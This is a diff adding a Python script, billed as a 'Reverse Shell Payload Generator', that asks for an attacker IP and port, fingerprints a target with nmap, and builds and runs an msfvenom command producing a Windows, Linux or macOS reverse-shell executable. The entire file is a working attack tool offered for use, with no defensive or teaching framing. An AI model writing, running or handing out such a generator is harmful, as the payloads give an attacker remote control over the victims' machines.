@@ -1,0 +1,65 @@
+#!usr/bin/python
+
+import os
+import subprocess
+
+from colorama import Fore, Back, Style
+
+print(Fore.RED + Back.BLACK)
+
+print("Welcome to the Reverse Shell Payload Generator")
+
+print(Fore.WHITE)
+
+filename = input("Please enter the name you want for the file: ")
+
+# Get info from user
+
+print(Fore.CYAN)
+
+attackerIP = input("Please enter your IP address: " + "\n")
+
+attackerPort = input("Enter a port number (1 - 65,535): " +"\n")
+
+meterpreter = input("Would you like to use meterpreter? (y/n): " + "\n")
+
+stageless = input("Do you want the payload to be stageless? (y/n): " + "\n")
+
+# Enumerate target
+
+print(Fore.RED)
+
+targetIP = input("Please enter the IP of the target machine: ")
+print(Fore.WHITE)
+osInfo = str(subprocess.check_output(["nmap", "-O", targetIP]))
+print(type(osInfo))
+print(osInfo)
+
+os = ""
+payload = ""
+
+if osInfo.find("windows") != -1:
+    print(Fore.GREEN)
+    os = "windows"
+    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")
+
+elif osInfo.find("linux") != -1:
+    print(Fore.MAGENTA)
+    os = "linux"
+    payload = ("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f elf -o"+ filename)
+
+elif osInfo.find("osx") != -1:
+    print(Fore.BLUE)
+    os = "osx"
+    payload = ("msfvenom -p osx/x86/shell_reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f macho -o"+ filename)
+
+elif os == "":
+    print(Fore.GREEN + "[*] Unable to profile OS, defaulting to Windows.")
+    os = "windows"
+    payload = ("msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST="+attackerIP+" LPORT="+attackerPort+" EXITFUNC=thread -f exe -o"+ filename+".exe")
+
+
+
+print(Fore.GREEN + "[*] Exporting payload, please be patient as: " + filename)
+subprocess.Popen(payload, shell=True).wait()
+print("[*] Exported payload successfully.")
